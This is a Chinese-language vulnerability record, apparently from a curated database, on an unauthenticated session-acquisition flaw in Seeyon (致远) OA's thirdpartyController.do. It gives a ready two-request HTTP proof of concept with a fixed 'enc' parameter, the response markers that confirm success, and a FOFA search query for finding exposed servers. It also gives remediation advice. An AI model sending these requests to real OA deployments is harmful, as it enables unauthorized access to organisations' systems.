---
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/seeyou/Seeyon-Unauthori-Access.yaml"
title: "致远OA thirdpartyController.do第三方参数会话获取"
product: "致远OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "范围未披露，固定enc作用/时间绑定未知"
prerequisites: "未正常登录获取session声称，正文强调隔离现有会话"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA-thirdpartyController.do-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"致远互联-OA\""
id: "vw-4323de9ec24261bf5b20e111"
entity_id: "ve-4323de9ec24261bf5b20e111"
schema_version: "1"
---

# 致远OA thirdpartyController.do第三方参数会话获取

## 条目说明

- 对象与具体问题：致远OA；thirdpartyController.do第三方参数会话获取
- 版本、配置及部署条件：范围未披露，固定enc作用/时间绑定未知
- 认证与权限前提：未正常登录获取session声称，正文强调隔离现有会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两请求、会话传递、对照及不能断言管理员边界清晰
- 固定commit可追溯；enc未解码解释用户/配置绑定，属下一步证据缺口
- 与ajax.do路径穿越中出现thirdpartyController只是路由名，不同风险不可合并

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

致远 OA 的 `thirdpartyController.do` 被公开 PoC 列为会话获取入口。PoC 提交特定第三方访问参数，提取返回的 `JSESSIONID` 后访问主界面，用于检测未经正常登录流程取得应用会话的风险。

### 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

### 公开验证方法

```http
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: example.invalid
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
```

```http
GET /seeyon/main.do HTTP/1.1
Host: example.invalid
Cookie: JSESSIONID=<上一响应返回的会话值>
```

来源要求第二次响应为 200，同时包含“当前已登录了一个用户，同一窗口中不能登录多个用户”和退出链接 `<a href='/seeyon/main.do?method=logout'`。应隔离既有会话，并与不携带 Cookie 的访问对照；获得 JSESSIONID 或命中通用页面不能单独证明权限提升，更不能据此断言管理员身份。本文仅核对公开源码，未获取目标会话或进行本地复现。

### 修复建议

向致远获取适用更新。限制第三方访问接口的信任来源，校验身份绑定及会话生成条件，避免仅凭固定参数授予会话。

### 参考链接

- [LittleBear4/OA-EXPTOOL 原始 PoC（固定提交）](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/seeyou/Seeyon-Unauthori-Access.yaml)

### 网络测绘

```text
app="致远互联-OA"
```
